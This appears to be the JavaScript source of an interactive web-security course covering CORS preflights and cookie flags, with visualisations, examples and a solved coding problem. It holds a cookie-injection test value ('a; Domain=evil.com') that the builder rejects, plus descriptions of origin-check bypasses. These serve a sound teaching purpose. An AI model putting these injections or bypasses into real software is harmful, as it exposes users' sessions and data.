        narr: 'The browser asks: is this a <b>simple</b> request? ' + (pre ? '<span class="c-r">No: ' + why.join(' + ') + ' is not safelisted, so it must <b>preflight</b>.</span>' : '<span class="c-g">Yes: safelisted method, headers and content type. No preflight needed, it sends the real request straight away.</span>'),
        parts: [g(null, {}, { BR: pre ? 'preflight needed' : 'simple request' }, { BR: 'cur' }),
          { type: 'vars', label: 'Browser checks', vals: { method: method, 'content-type': ct, 'custom header': hdr || 'none', 'preflight?': pre ? 'YES' : 'no' }, hl: { 'preflight?': pre ? 'bad' : 'ok' } }]
      });
      if (pre) {
        frames.push({
          narr: 'Step 1: the browser sends a <b>preflight</b> <code>OPTIONS</code> request on its own. No cookies, no body. It lists what the real request <em>wants to do</em>.',
          parts: [g(['BR', 'API', 'OPTIONS'], { 'BR-API': 'cur' }, { API: 'receives OPTIONS' }, { BR: 'cur' }),
            { type: 'code', label: 'Preflight request', lang: 'http', code: 'OPTIONS /orders/42 HTTP/1.1\nOrigin: https://app.example.com\nAccess-Control-Request-Method: ' + method + '\nAccess-Control-Request-Headers: ' + ([ct !== '-' ? 'content-type' : '', hdr].filter(Boolean).join(', ') || '(none)'), hl: { 1: 'cur', 2: 'cur', 3: 'cur' } }]
        });
        frames.push({
          narr: allow ? 'Step 2: the server answers <code>204</code> with <b>Allow-Origin / Allow-Methods / Allow-Headers</b>. It is saying "yes, that origin may do that".' : 'Step 2: the server answers <code>204</code> but <b>without</b> any <code>Access-Control-Allow-*</code> headers (or with the wrong origin). It is saying "no".',
          parts: [g(['API', 'BR', allow ? '204 + Allow-*' : '204, no Allow-*'], { 'API-BR': allow ? 'ok' : 'bad' }, { API: allow ? 'allows' : 'denies' }, { API: allow ? 'ok' : 'bad' }),
            { type: 'code', label: 'Preflight response', lang: 'http', code: allow ? 'HTTP/1.1 204 No Content\nAccess-Control-Allow-Origin: https://app.example.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: content-type, ' + (hdr || 'authorization') + '\nAccess-Control-Max-Age: 600' : 'HTTP/1.1 204 No Content\n(no Access-Control-Allow-Origin header)', hl: allow ? { 2: 'ok', 3: 'ok', 4: 'ok' } : { 2: 'bad' } }]
        });
        if (!allow) {
          frames.push({
            narr: '<span class="c-r">The browser compares and fails.</span> The <b>real ' + method + ' is never sent</b>. Your code gets a network error and DevTools prints a CORS message. Nothing reached your handler, so no data was changed.',
            parts: [g(['BR', 'PG', 'TypeError: CORS'], { 'BR-PG': 'bad' }, { BR: 'BLOCKED', API: 'never sees ' + method }, { BR: 'bad' })]
          });
          return frames;
        }
        frames.push({
          narr: 'Step 3: the browser checks that its origin, the method <b>' + method + '</b> and every header are on the allowed lists. All good, so it may now send the <b>real request</b> (this time with cookies if you asked for them).',
          parts: [g(['BR', 'API', reqLine], { 'BR-API': 'ok' }, { BR: 'preflight passed' }, { BR: 'ok' })]
        });
      } else {
        frames.push({
          narr: 'The browser sends the real request straight away, adding an <code>Origin: https://app.example.com</code> header so the server knows who is asking.',
          parts: [g(['BR', 'API', reqLine], { 'BR-API': 'cur' }, { BR: 'adds Origin header' }, { BR: 'cur' })]
        });
      }
      frames.push({
        narr: 'The server runs the handler and responds. ' + (allow ? 'The response carries <code>Access-Control-Allow-Origin: https://app.example.com</code>.' : '<span class="c-r">The response has no <code>Access-Control-Allow-Origin</code>.</span> <b>The handler already ran</b> (side effects happened!).'),
        parts: [g(['API', 'BR', allow ? '200 + ACAO' : '200, no ACAO'], { 'API-BR': allow ? 'ok' : 'bad' }, { API: 'handler ran' }, { API: allow ? 'ok' : 'bad' })]
      });
      if (allow) {
        frames.push({ narr: '<span class="c-g">Final check passes.</span> The browser hands the response to the page. Cross-origin reading works because the server opted in.', parts: [g(['BR', 'PG', 'response data'], { 'BR-PG': 'ok' }, { PG: 'got JSON' }, { PG: 'ok' })] });
      } else {
        frames.push({ narr: '<span class="c-r">CORS error.</span> A simple request is sent and processed, but the browser hides the response from the page. This is why CORS does <b>not</b> protect your server from forged requests; that is a job for CSRF defences.', parts: [g(['BR', 'PG', 'TypeError: CORS'], { 'BR-PG': 'bad' }, { BR: 'response hidden' }, { BR: 'bad' })] });
      }
      return frames;
    }
  },
  examples: [
    {
      title: 'A plain GET: simple request, still needs Allow-Origin',
      html: `<p><code>fetch('https://api.example.com/products')</code> from <code>https://app.example.com</code>. Method GET, no extra headers → <b>no preflight</b>. The browser sends the request with <code>Origin: https://app.example.com</code>. If the response lacks <code>Access-Control-Allow-Origin</code>, the request still reached the server (it is in your logs) but your <code>.then()</code> never gets the data. "No preflight" does not mean "no CORS".</p>`
    },
    {
      title: 'The JSON surprise: POST + application/json',
      html: `<p><code>fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })</code> looks like a normal form POST but triggers a preflight, because <code>application/json</code> is <b>not</b> one of the three form content types. A forgotten <code>OPTIONS</code> route is the number one cause of "my POST fails but GET works". Sending the body as <code>text/plain</code> to dodge the preflight is a known trick, but it also removes a CSRF safeguard; do not do it for state-changing endpoints.</p>`
    },
    {
      title: 'Cookies and the wildcard trap',
      html: `<p>You call <code>fetch(url, { credentials: 'include' })</code> and the server answers <code>Access-Control-Allow-Origin: *</code> plus <code>Allow-Credentials: true</code>. The browser rejects it: <i>"The value of the 'Access-Control-Allow-Origin' header must not be the wildcard '*' when the request's credentials mode is 'include'"</i>. The fix is to return the <b>specific</b> origin from an allowlist and add <code>Vary: Origin</code>.</p>
      ${H.table(['Server answer', 'Credentialed fetch works?'], [['<code>ACAO: *</code>', H.c('r', 'No')], ['<code>ACAO: https://app.example.com</code> only', H.c('r', 'No, needs <code>Allow-Credentials: true</code> too')], ['<code>ACAO: https://app.example.com</code> + <code>ACAC: true</code>', H.c('g', 'Yes')], ['reflect any Origin + <code>ACAC: true</code>', H.c('r', 'Works, but any site can now read user data: a vulnerability')]])}`
    },
    {
      title: 'Why does my OPTIONS return 401 or 404?',
      html: `<p>Auth middleware often runs before the CORS middleware and rejects the preflight because the browser deliberately sends <b>no</b> <code>Authorization</code> header or cookie on it. Likewise a router that has only <code>app.put('/orders')</code> returns 404/405 for <code>OPTIONS</code>. The fix is to put CORS handling <em>first</em> and have it answer <code>OPTIONS</code> with <code>204</code> before authentication runs. Also remember redirects are not allowed on preflights: <code>http://</code> → <code>https://</code> redirects on the API URL break them.</p>`
    }
  ],
  deepDive: `<p><b>The exact algorithm.</b> The Fetch standard says: for a cross-origin request in <code>cors</code> mode, if the request is not simple, do a preflight; then in the real response, check <code>Access-Control-Allow-Origin</code> (and <code>Allow-Credentials</code> if credentials were sent). Reading is blocked by returning a <i>network error</i> to the caller, so scripts see only a vague <code>TypeError: Failed to fetch</code>. The details are in DevTools on purpose, so pages cannot probe the failure for information leaks.</p>
  <p><b>Preflight cache.</b> The browser caches successful preflights keyed by (origin, URL, credentials mode). <code>Access-Control-Max-Age</code> sets the time; Chromium caps it at 2 hours, Firefox at 24 hours, and the default when absent is 5 seconds. So a chatty SPA with many distinct URLs (<code>/orders/1</code>, <code>/orders/2</code>...) still preflights each URL. Designing APIs with one stable URL or using a same-origin gateway avoids doubled latency.</p>
  <p><b>Vary: Origin is not optional.</b> If your server varies <code>Access-Control-Allow-Origin</code> by request origin, any shared cache (CDN, proxy, even the browser’s HTTP cache) must know. Without <code>Vary: Origin</code>, the CDN can cache the response for origin A and serve it to origin B, causing broken CORS or, worse, leaking a response meant for A.</p>
  <p><b>Common vulnerabilities.</b> (1) Reflecting <code>Origin</code> with credentials = any website can read your users’ data. (2) Regex or <code>endsWith</code> checks: <code>/example.com$/</code> accepts <code>evil-example.com</code>; <code>indexOf('example.com')</code> accepts <code>example.com.evil.io</code>. (3) Allowing <code>null</code> origin (sandboxed iframes, file://). (4) Trusting every subdomain when one of them has an XSS or takeover. (5) Internal APIs reachable by pages on the public internet via the user’s browser (DNS rebinding and the Local/Private Network Access preflight in Chromium).</p>
  <p><b>Things CORS does not cover.</b> WebSockets have no CORS; the server must check the <code>Origin</code> header in the handshake itself. <code>&lt;script src&gt;</code> and <code>&lt;img&gt;</code> are not CORS requests unless you add <code>crossorigin</code>; a canvas drawn with a cross-origin image becomes "tainted" unless the image is CORS-approved. <code>mode: 'no-cors'</code> gives an <i>opaque</i> response (status 0, empty body): fine for fire-and-forget analytics pings, useless for reading data.</p>
  <p><b>Related headers.</b> <code>Timing-Allow-Origin</code> (expose resource timing), <code>Cross-Origin-Resource-Policy</code> (a server-side opt-out for no-cors embeds), and <code>Access-Control-Expose-Headers</code> (lets JS read headers beyond the six safelisted response headers such as <code>Content-Type</code> and <code>Cache-Control</code>).</p>`,
  aiEra: `<p><b>What AI changes:</b> CORS errors are the most pasted error into chatbots. AI is great at explaining the exact missing header and at generating framework-specific config (Express <code>cors</code>, Spring <code>@CrossOrigin</code>, Nginx <code>add_header</code>). It can also read a HAR file and tell you which hop (CDN, gateway, app) dropped the header.</p>
  <p><b>Use AI as a partner:</b> give it the failing request and response headers and ask <code>Which exact header is wrong and at which layer? Do not suggest the wildcard</code>. Ask it to write tests that send <code>Origin: https://evil.example</code> and assert the response has <em>no</em> Allow-Origin.</p>
  <p><b>Where AI goes wrong:</b> it loves <code>origin: '*'</code> or <code>origin: true</code> (reflect everything) together with <code>credentials: true</code>; it forgets <code>Vary: Origin</code>; it duplicates headers when both the gateway and the app add CORS (the browser rejects a response with <i>two</i> Allow-Origin values); and it suggests browser extensions or <code>--disable-web-security</code> as a "fix".</p>
  <p><b>What you must still own:</b> deciding the allowlist, understanding that CORS is a browser rule rather than a server defence, and knowing which layer owns the headers so the fix lives in exactly one place.</p>`,
  problems: [{
    title: 'Will This Request Trigger a Preflight?',
    level: 'Medium', tags: ['CORS', 'preflight', 'fetch'], companies: ['Google', 'Stripe', 'Atlassian'],
    statement: `<p>Implement <code>needsPreflight(method, headers)</code> for a cross-origin <code>fetch</code>. Return <code>{ preflight: boolean, reasons: string[] }</code>. A preflight is needed when the method is not GET/HEAD/POST, when any header is not CORS-safelisted (<code>accept</code>, <code>accept-language</code>, <code>content-language</code>, <code>content-type</code>, <code>range</code>), or when <code>content-type</code> is present but its media type (ignoring parameters like <code>;charset=UTF-8</code>) is not <code>text/plain</code>, <code>application/x-www-form-urlencoded</code> or <code>multipart/form-data</code>. Header names are case-insensitive; method names are case-insensitive.</p>`,
    constraints: `0 ≤ headers ≤ 30. Header values are strings. No need to handle value-length limits or <code>ReadableStream</code> bodies.`,
    example: `${H.table(['Request', 'Answer', 'Why'], [['GET, {}', H.c('g', 'no preflight'), 'simple method, no headers'], ['POST, content-type: application/json', H.c('r', 'preflight'), 'JSON is not a form content type'], ['get, Authorization: Bearer x', H.c('r', 'preflight'), 'authorization is not safelisted'], ['POST, Content-Type: text/plain;charset=UTF-8', H.c('g', 'no preflight'), 'parameters are ignored']])}`,
    brute: {
      why: `<p>Only looking at the method is the naive version. It says "POST is fine" and misses that a JSON content type or an <code>Authorization</code> header forces an <code>OPTIONS</code> first. The reverse naive approach, "always assume a preflight", is safe but hides the cost: you cannot reason about doubled latency or about why a server needs an <code>OPTIONS</code> route.</p>`,
      code: `function needsPreflightBrute(method) {
  // Looks only at the method: wrong for JSON bodies and custom headers
  return ['GET', 'HEAD', 'POST'].indexOf(method.toUpperCase()) === -1;
}`
    },
    mcq: { q: 'A page at https://a.com calls fetch("https://b.com/api", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }). What happens first?', options: ['The POST is sent immediately; only the response is checked', 'An OPTIONS preflight is sent and must be approved before the POST', 'The browser blocks it because POST is never allowed cross-origin', 'Nothing, JSON is a safelisted content type'], answer: 1, explain: 'application/json is not safelisted, so the browser sends an automatic OPTIONS preflight. Only if the server approves the origin, method and headers does the real POST go out.' },
    hints: [
      `<p>Hint 1: There are exactly three independent reasons to preflight: the method, a non-safelisted header name, a bad content-type value. Any one is enough.</p>`,
      `<p>Hint 2: Lower-case every header name first. For <code>content-type</code> look only at the part before the first <code>;</code>, trimmed and lower-cased.</p>`,
      `<p>Hint 3: Recipe: <code>reasons = []</code>; if method not in safe list push a reason; for each header: if name not in the safe list push; else if it is content-type and the essence is not in the 3 form types push. Return <code>reasons.length &gt; 0</code> with the reasons.</p>`
    ],
    solution: {
      approach: `<p>Collect reasons instead of returning early: it makes the function a debugging tool ("why is my request preflighted?"), not only a yes/no answer. Header names are lower-cased; the content-type essence is extracted before the semicolon.</p>`,
      code: {
        lang: 'js', run: true, code: `var SAFE_METHODS = ['GET', 'HEAD', 'POST'];
var SAFE_HEADERS = ['accept', 'accept-language', 'content-language', 'content-type', 'range'];
var FORM_TYPES = ['text/plain', 'application/x-www-form-urlencoded', 'multipart/form-data'];

function needsPreflight(method, headers) {
  var reasons = [];
  var m = String(method).toUpperCase();
  if (SAFE_METHODS.indexOf(m) === -1) reasons.push('method ' + m);
  var names = Object.keys(headers || {});
  for (var i = 0; i < names.length; i++) {
    var name = names[i].toLowerCase();
    if (SAFE_HEADERS.indexOf(name) === -1) {
      reasons.push('header ' + name);
    } else if (name === 'content-type') {
      var essence = String(headers[names[i]]).split(';')[0].trim().toLowerCase();
      if (FORM_TYPES.indexOf(essence) === -1) reasons.push('content-type ' + essence);
    }
  }
  return { preflight: reasons.length > 0, reasons: reasons };
}

console.log(JSON.stringify(needsPreflight('GET', {})));
console.log(JSON.stringify(needsPreflight('POST', { 'content-type': 'application/json' })));
console.log(JSON.stringify(needsPreflight('get', { Authorization: 'Bearer x' })));
console.log(JSON.stringify(needsPreflight('POST', { 'Content-Type': 'text/plain;charset=UTF-8' })));
console.log(JSON.stringify(needsPreflight('PATCH', { 'X-Id': '1', Accept: '*/*' })));`
      },
      dry: {
        head: ['Input', 'method check', 'header check', 'result'],
        rows: [
          ['POST + content-type: application/json', 'POST ok', 'application/json not a form type → reason', '<span class="c-r">preflight</span>'],
          ['get + Authorization', 'GET ok', 'authorization not safelisted → reason', '<span class="c-r">preflight</span>'],
          ['POST + text/plain;charset=UTF-8', 'POST ok', 'essence text/plain ok', '<span class="c-g">no preflight</span>']
        ]
      },
      complexity: `<p>Time O(H) for H headers (constant-size lists); space O(H) for the reasons.</p>`,
      followUps: ['How would the answer change if the request body were a ReadableStream?', 'Add the CORS-safelisted rule that values must be at most 128 bytes.']
    }
  }]
});

/* ============================ TOPIC 3: COOKIES ============================ */
topics.push({
  title: 'Cookies: SameSite, HttpOnly, Secure and Friends',
  analogy: `<p>A cookie is like a <b>wristband at a festival</b>. The gate (server) gives you one after you show your ticket (log in). From then on, every stall (request) just checks the wristband. Now the settings on that wristband matter: <b>HttpOnly</b> = the band is under a sleeve, so even a pickpocket reading your arm (malicious JavaScript) cannot see the number. <b>Secure</b> = only show it inside the safe festival tents (HTTPS), never in the open street. <b>SameSite</b> = only show it when you walked to the stall yourself, not when a stranger pushed you there.</p>`,
  explain: `<p>A <b>cookie</b> is a small piece of text the server asks the browser to store (<code>Set-Cookie</code> header) and that the browser then attaches automatically to later requests (<code>Cookie</code> header) for matching sites. "Automatically" is the key word: it is both the convenience and the danger.</p>
  ${H.table(['Attribute', 'What it does', 'Stops what?'], [
    ['<code>HttpOnly</code>', 'JavaScript cannot read it (<code>document.cookie</code> does not list it)', H.c('g', 'Token theft by XSS (reading)')],
    ['<code>Secure</code>', 'Only sent over HTTPS (and stored only from HTTPS responses)', H.c('g', 'Sniffing on open Wi-Fi, downgrade attacks')],
    ['<code>SameSite=Strict</code>', 'Sent only when the request comes from the same site', H.c('g', 'CSRF (strongest); costs: you look logged out after clicking a link from elsewhere')],
    ['<code>SameSite=Lax</code>', 'Sent on same-site requests and on cross-site <b>top-level GET navigations</b> (clicking a link)', H.c('g', 'Most CSRF; the default in modern browsers')],
    ['<code>SameSite=None; Secure</code>', 'Sent on every request, including cross-site (must be Secure)', H.c('r', 'Nothing: you opt out of protection. Needed for embeds/widgets')],
    ['<code>Domain=shop.com</code>', 'Also sent to every subdomain', H.c('y', 'Widens the blast radius. Omit it for host-only cookies')],
    ['<code>Path=/</code>', 'Which URL paths receive it', H.c('y', 'Not a security boundary')],
    ['<code>Max-Age</code> / <code>Expires</code>', 'Lifetime. Without them it is a <i>session cookie</i> (until the browser closes)', H.c('y', 'Limits how long a stolen cookie works')],
    ['<code>__Host-</code> prefix', 'Name starts with <code>__Host-</code>: browser requires Secure, Path=/ and <b>no</b> Domain', H.c('g', 'Subdomain cookie injection / overwriting')]
  ])}
  <p><b>Recommended session cookie</b> for a normal website:</p>
  <pre>Set-Cookie: __Host-sid=PLACEHOLDER; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600</pre>
  <p><b>Same-site, not same-origin.</b> SameSite compares <em>registrable domains</em>. <code>app.shop.com</code> → <code>api.shop.com</code> is same-site, so the cookie is sent. <code>shop.com</code> → <code>shop-pay.com</code> is cross-site.</p>
  <p><b>Third-party cookies.</b> A cookie set by a domain different from the page you see (an ad, a chat widget, an embedded payment form). Safari and Firefox block them by default. Chrome has kept them but gives users controls, and recommends <code>Partitioned</code> cookies (CHIPS) for embeds: the cookie is keyed by (embedded site, top-level site), so it cannot follow you around the web. Never design a login system that depends on third-party cookies.</p>
  <p><b>Rule of thumb:</b> session id or auth token in a cookie → <code>HttpOnly; Secure; SameSite=Lax</code> (or <code>Strict</code> for banking-style apps). Small UI preferences like theme → readable by JS is fine, but still <code>Secure; SameSite=Lax</code>. Never put secrets or personal data inside a cookie value you let JS read.</p>`,
  clues: [
    '"How do you stop JavaScript (XSS) from stealing the session?" → <code>HttpOnly</code>',
    '"Cookie must never travel over plain HTTP" → <code>Secure</code> (+ HSTS)',
    '"Prevent CSRF without tokens" or "cookie sent from another site" → <code>SameSite=Lax/Strict</code>',
    '"Embedded iframe/widget needs to read its cookie on a partner site" → <code>SameSite=None; Secure</code> (+ <code>Partitioned</code>)',
    '"SameSite=None without Secure" → the browser rejects the cookie',
    '"Cookie shared by app. and api. subdomains" → <code>Domain=</code>; the safer alternative is separate host-only cookies',
    '"Session fixation" → issue a <b>new</b> session id on login'
  ],
  code: [
    {
      lang: 'js', run: true, title: 'Set-Cookie builder with safety checks (runs in your browser)',
      code: `// Build a Set-Cookie header the safe way. Throws on dangerous input.
function buildSetCookie(name, value, o) {
  o = o || {};
  // Only "token" characters: no ';' ',' space or control characters (cookie injection).
  if (!/^[A-Za-z0-9._~-]+$/.test(name)) throw new Error('bad cookie name');
  if (!/^[A-Za-z0-9._~%-]*$/.test(value)) throw new Error('bad cookie value: encode it first');

  var sameSite = o.sameSite || 'Lax';
  if (['Strict', 'Lax', 'None'].indexOf(sameSite) === -1) throw new Error('bad SameSite');
  // Browsers drop SameSite=None cookies that are not Secure.
  var secure = o.secure !== false;
  if (sameSite === 'None' && !secure) throw new Error('SameSite=None requires Secure');

  var parts = [name + '=' + value];
  if (name.indexOf('__Host-') === 0) {
    // __Host- : Secure, Path=/, and NO Domain attribute.
    if (!secure || o.domain) throw new Error('__Host- needs Secure and no Domain');
    parts.push('Path=/');
  } else {
    if (o.domain) parts.push('Domain=' + o.domain);
    parts.push('Path=' + (o.path || '/'));
  }
  if (secure) parts.push('Secure');
  if (o.httpOnly !== false) parts.push('HttpOnly');       // default ON: opt OUT only with a reason
  parts.push('SameSite=' + sameSite);
  if (o.maxAge !== undefined) parts.push('Max-Age=' + Math.floor(o.maxAge));
  return 'Set-Cookie: ' + parts.join('; ');
}

console.log(buildSetCookie('__Host-sid', 'PLACEHOLDER', { maxAge: 3600 }));
console.log(buildSetCookie('theme', 'dark', { httpOnly: false, maxAge: 31536000 }));
console.log(buildSetCookie('widget', 'abc123', { sameSite: 'None' }));
try { buildSetCookie('sid', 'x', { sameSite: 'None', secure: false }); } catch (e) { console.log('rejected: ' + e.message); }
try { buildSetCookie('sid', 'a; Domain=evil.com', {}); } catch (e) { console.log('rejected: ' + e.message); }`
    },
    {
      lang: 'js', title: 'Reading vs sending cookies from the page (browser code)',
      code: `// 1) JS can only see cookies that are NOT HttpOnly.
console.log(document.cookie);          // "theme=dark" (the HttpOnly session id is not listed)

// 2) Cookies are only sent cross-origin if YOU opt in on the fetch...
fetch('https://api.shop.com/me', { credentials: 'include' });   // send cookies cross-origin
// ...and the server answers Access-Control-Allow-Credentials: true + a specific origin.

// 3) Deleting a cookie = set it again with the SAME name/Domain/Path and a past expiry.
document.cookie = 'theme=; Max-Age=0; Path=/';`
    },
    {
      lang: 'js', check: false, title: 'Express session cookie (framework code)',
      code: `const session = require('express-session');

app.set('trust proxy', 1);                 // behind a TLS-terminating proxy, so Secure works
app.use(session({
  name: '__Host-sid',
  secret: process.env.SESSION_SECRET,      // from the environment, never committed
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,                        // hide from document.cookie
    secure: true,                          // HTTPS only
    sameSite: 'lax',                       // CSRF seatbelt
    maxAge: 60 * 60 * 1000                 // 1 hour
    // no "domain": host-only, required by the __Host- prefix
  }
}));

// After a successful login, create a NEW session id (prevents session fixation).
app.post('/login', (req, res) => {
  req.session.regenerate(() => { req.session.userId = 42; res.sendStatus(204); });
});`
    }
  ],
  codeTitle: ['Safe Set-Cookie builder', 'document.cookie and credentials', 'Express session cookie'],
  viz: {
    title: 'Cookie flags decide who gets the cookie',
    input: 'Lax HttpOnly Secure',
    inputLabel: 'Flags (try: Strict | Lax | None | HttpOnly | Secure)',
    gen: function (input) {
      var t = String(input).toLowerCase().split(/[\s;,]+/).filter(Boolean);
      var okTok = ['strict', 'lax', 'none', 'httponly', 'secure'];
      t.forEach(function (x) { if (okTok.indexOf(x) < 0) throw new Error('Use only: Strict, Lax, None, HttpOnly, Secure'); });
      var ss = t.indexOf('strict') >= 0 ? 'Strict' : (t.indexOf('none') >= 0 ? 'None' : 'Lax');
      var ho = t.indexOf('httponly') >= 0, sec = t.indexOf('secure') >= 0;
      var stored = !(ss === 'None' && !sec);
      var header = 'Set-Cookie: sid=PLACEHOLDER; SameSite=' + ss + (sec ? '; Secure' : '') + (ho ? '; HttpOnly' : '');
      var scen = [
        { t: 'Normal: you click Buy inside shop.com (same-site, https)', atk: false, sent: true, lab: ['sent', 'not sent'] },
        { t: 'Normal: you follow a link to shop.com from a blog (cross-site GET)', atk: false, sent: ss !== 'Strict', lab: ['sent', 'not sent'] },
        { t: 'Attack: evil.com auto-submits a POST form to shop.com', atk: true, sent: ss === 'None', lab: ['sent', 'not sent'] },
        { t: 'Attack: evil.com embeds an img/fetch pointing at shop.com', atk: true, sent: ss === 'None', lab: ['sent', 'not sent'] },
        { t: 'Attack: injected script reads document.cookie (XSS)', atk: true, sent: !ho, lab: ['readable', 'hidden'] },
        { t: 'Attack: sniffer sees a plain http:// request on cafe Wi-Fi', atk: true, sent: !sec, lab: ['sent in clear', 'not sent'] }
      ];
      var frames = [], rows = [];
      frames.push({
        narr: 'The server sets the cookie with these flags. ' + (stored ? 'The browser accepts it. Now we test six situations, three normal and three attacks.' : '<span class="c-r">SameSite=None without Secure is rejected: the browser will not even store this cookie.</span>'),
        parts: [{ type: 'code', label: 'Response header', lang: 'http', code: header, hl: { 1: stored ? 'ok' : 'bad' } },
          { type: 'table', label: 'Scenarios', columns: ['Situation', 'Cookie', 'Good for you?'], rows: [['(not tested yet)', '', '']] }]
      });
      scen.forEach(function (s) {
        var sent = stored && s.sent;
        var good = s.atk ? !sent : sent;
        if (!stored) { sent = false; good = s.atk; }
        var lab = !stored ? 'never stored' : (sent ? s.lab[0] : s.lab[1]);
        rows.push([s.t, lab, good ? '<span class="c-g">yes</span>' : '<span class="c-r">no</span>']);
        var hl = {}; hl[rows.length - 1] = good ? 'ok' : 'bad';
        frames.push({
          narr: s.t + ' → <b>' + lab + '</b>. ' + (good ? '<span class="c-g">That is the outcome you want here.</span>' : (s.atk ? '<span class="c-r">The attack works: this flag is missing or too loose.</span>' : '<span class="c-r">A real user is hurt: they appear logged out or the app breaks.</span>')),
          parts: [{ type: 'code', label: 'Response header', lang: 'http', code: header }, { type: 'table', label: 'Scenarios', columns: ['Situation', 'Cookie', 'Good for you?'], rows: rows.slice(), hl: hl }]
        });
      });
      var bad = rows.filter(function (r) { return r[2].indexOf('c-r') >= 0; }).length;
      frames.push({
        narr: 'Result: <b>' + bad + ' of 6</b> situations are not what you want. ' + (bad === 0 ? '<span class="c-g">HttpOnly + Secure + SameSite=Lax is the sweet spot for a session cookie.</span>' : 'Try <code>Lax HttpOnly Secure</code> and compare. Strict is stronger for CSRF but breaks "arrive from a link" logins.'),
        parts: [{ type: 'table', label: 'Final', columns: ['Situation', 'Cookie', 'Good for you?'], rows: rows.slice() }]
      });
      return frames;
    }
  },
  examples: [
    {
      title: 'Choosing flags for a normal website login',
      html: `<p>Shop at <code>shop.com</code>, API under the same origin. You need: JS must not read the session (<b>HttpOnly</b>), HTTPS only (<b>Secure</b>), no cross-site POSTs carrying it (<b>SameSite=Lax</b>), tied to the exact host (<b>no Domain</b>, so use the <b>__Host-</b> prefix), and a lifetime (Max-Age 1 hour with a sliding idle timeout on the server).</p>
      <pre>Set-Cookie: __Host-sid=PLACEHOLDER; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600</pre>`
    },
    {
      title: 'A third-party payment widget inside an iframe',
      html: `<p>Your page embeds <code>https://pay.partner.com/widget</code>. The widget keeps its own session cookie; the browser treats it as <b>cross-site</b>, so <code>Lax</code> would never send it. The partner must use <code>SameSite=None; Secure</code>, and ideally <code>Partitioned</code> so the cookie is stored per top-level site. Expect it to be blocked entirely in Safari/Firefox and design a fallback (e.g. Storage Access API prompt, or a redirect-based flow).</p>
      <pre>Set-Cookie: widget=PLACEHOLDER; Secure; HttpOnly; SameSite=None; Partitioned; Path=/</pre>`
    },
    {
      title: 'Sharing a login between app.shop.com and api.shop.com',
      html: `<p>Option A: <code>Domain=shop.com</code> → every subdomain (including a forgotten <code>old-blog.shop.com</code> with an XSS bug or a dangling DNS record) receives, and can <em>overwrite</em>, the cookie. Option B: keep the cookie host-only on <code>api.shop.com</code> only, send requests with <code>credentials: 'include'</code> and CORS. Option B is safer; a <code>__Host-</code> prefixed cookie cannot be set from a sibling subdomain at all.</p>`
    },
    {
      title: 'A readable "theme" cookie vs an unreadable session cookie',
      html: `<p>Preferences like <code>theme=dark</code> or <code>lang=en</code> are not secrets. The server <em>and</em> your JS may read them, so leave <code>HttpOnly</code> off. The session id, by contrast, must always be <code>HttpOnly</code>. If you notice you need JS to read an auth token, the design is usually wrong: let the cookie travel automatically and use a CSRF token for writes (next topics).</p>
      ${H.table(['Cookie', 'HttpOnly', 'Secure', 'SameSite', 'Why'], [['<code>__Host-sid</code>', H.c('g', 'yes'), H.c('g', 'yes'), 'Lax', 'secret, auto-sent'], ['<code>csrf-token</code> (double submit)', H.c('y', 'no'), H.c('g', 'yes'), 'Lax or Strict', 'JS must copy it to a header'], ['<code>theme</code>', 'no', H.c('g', 'yes'), 'Lax', 'not secret']])}`
    }
  ],
  deepDive: `<p><b>How the browser decides to send a cookie.</b> For every request the browser walks its cookie jar and keeps a cookie when: (1) the request host matches the cookie’s domain (host-only exact match, or <code>Domain</code> + subdomains), (2) the path matches as a prefix, (3) not expired, (4) <code>Secure</code> cookies only on HTTPS (localhost is treated as secure), (5) SameSite allows it for this request’s context. Cookies are sorted longest-path first then oldest first, and joined with <code>; </code>. The server cannot tell <i>which</i> attribute each cookie had.</p>
  <p><b>Lax details.</b> Lax sends the cookie only for <i>top-level navigations with a safe method</i> (GET). A cross-site <code>POST</code> form, <code>fetch</code>, <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code> do not carry it. Chrome historically gave a "Lax+POST" two-minute grace period for cookies without an explicit SameSite; do not rely on it and always set SameSite explicitly. Lax still allows <b>state-changing GETs</b> to be triggered by link clicks: another reason never to change data on GET.</p>
  <p><b>Site vs origin and "schemeful same-site".</b> Browsers now also compare the scheme: <code>http://shop.com</code> → <code>https://shop.com</code> is treated as cross-site for SameSite. Same-site is computed from the Public Suffix List (so <code>a.github.io</code> and <code>b.github.io</code> are different sites).</p>
  <p><b>Attacks cookies still allow.</b> <i>Session fixation</i> (attacker plants a known session id: fix by regenerating on login). <i>Cookie tossing</i> (a vulnerable sibling subdomain sets a cookie for the parent domain: fix with <code>__Host-</code>). <i>Cookie bombing</i> (stuffing huge cookies so the server rejects every request: header size limits). <i>Subdomain takeover</i> (dangling CNAME gives an attacker a trusted subdomain). <i>CRLF injection</i> in <code>Set-Cookie</code> if you build the header from user input.</p>
  <p><b>Limits and performance.</b> ~4 KB per cookie, ~50-180 cookies per domain depending on the browser, and every cookie is sent on <b>every</b> request to that host, including images. Large cookies slow the whole site; keep the session cookie as an opaque id and store data on the server (or in <code>localStorage</code> if it is not secret).</p>
  <p><b>Newer features.</b> <code>Partitioned</code> (CHIPS) for embeds, the Storage Access API for third-party iframes, server-side <code>Clear-Site-Data: "cookies"</code> on logout, and Device Bound Session Credentials (DBSC) which tie a session to a hardware-held key so a stolen cookie is useless on another machine.</p>`,
  aiEra: `<p><b>What AI changes:</b> AI can audit a <code>Set-Cookie</code> header in seconds and tell you what is missing. Security scanners and LLM code reviewers flag cookies without <code>HttpOnly</code> or <code>Secure</code> in pull requests. Bot traffic also steals sessions at scale with infostealer malware, so short lifetimes and device binding matter more than ever.</p>
  <p><b>Use AI as a partner:</b> ask <code>Here are my Set-Cookie headers from production. List each cookie, which attacks its flags allow, and the minimal fix. Do not change cookie names without telling me what breaks.</code> Ask for a test matrix: same-site fetch, cross-site POST, http request.</p>
